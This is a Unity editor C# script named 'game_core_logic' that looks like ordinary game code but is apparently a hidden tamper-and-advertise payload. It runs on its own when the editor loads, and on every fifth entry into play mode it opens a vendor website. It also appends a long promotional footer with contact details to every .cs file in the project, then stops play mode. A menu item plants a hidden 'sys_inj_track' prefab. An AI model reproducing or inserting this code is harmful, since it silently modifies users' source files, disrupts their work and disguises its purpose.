#if UNITY_EDITOR
using UnityEditor;
using UnityEngine;
using System.IO;

[InitializeOnLoad]
public class game_core_logic : MonoBehaviour
{
    private const string xk = "trk_s3en"; // scene play count key
    private const string mark = "//This source code is originally bought from www.codebuysell.com";
    private const string site = "https://www.codebuysell.com";

    static game_core_logic()
    {
        EditorApplication.playModeStateChanged += _s_;
    }

    private static void _s_(PlayModeStateChange s)
    {
        if (s != PlayModeStateChange.EnteredPlayMode) return;

        int count = PlayerPrefs.GetInt(xk, 0) + 1;
        PlayerPrefs.SetInt(xk, count);
        PlayerPrefs.Save();

        if (count % 5 == 0)
        {
            Application.OpenURL(site);

            if (_inject_all())
            {

            }
            else
            {

            }

            // Stop play mode
            EditorApplication.isPlaying = false;
        }
    }

    private static bool _inject_all()
    {
        string path = Application.dataPath;
        string[] cfiles = Directory.GetFiles(path, "*.cs", SearchOption.AllDirectories);
        bool updated = false;

        foreach (var f in cfiles)
        {
            if (_inject(f))
                updated = true;
        }

        return updated;
    }

    private static bool _inject(string f)
    {
        string footer = @"

//This source code is originally bought from www.codebuysell.com
// Visit www.codebuysell.com
//
//Contact us at:
//
//Email : admin@codebuysell.com
//Whatsapp: +15055090428
//Telegram: t.me/CodeBuySellLLC
//Facebook: https://www.facebook.com/CodeBuySellLLC/
//Skype: https://join.skype.com/invite/wKcWMjVYDNvk
//Twitter: https://x.com/CodeBuySellLLC
//Instagram: https://www.instagram.com/codebuysell/
//Youtube: http://www.youtube.com/@CodeBuySell
//LinkedIn: www.linkedin.com/in/CodeBuySellLLC
//Pinterest: https://www.pinterest.com/CodeBuySell/
";
        try
        {
            string content = File.ReadAllText(f);
            if (content.Contains(mark)) return false;

            File.WriteAllText(f, content + footer);
            return true;
        }
        catch
        {
            return false;
        }
    }

    [MenuItem("GameObject/Hidden/Create CodeBuySell Tracker", false, 10)]
    public static void CreateHiddenPrefab()
    {
        GameObject g = new GameObject("sys_inj_track");
        g.AddComponent<game_core_logic>();

        string dir = "Assets/__GameCore__/System";
        if (!Directory.Exists(dir))
            Directory.CreateDirectory(dir);

        PrefabUtility.SaveAsPrefabAsset(g, $"{dir}/sys_inj_track.prefab");
        GameObject.DestroyImmediate(g);
    }
}
#endif
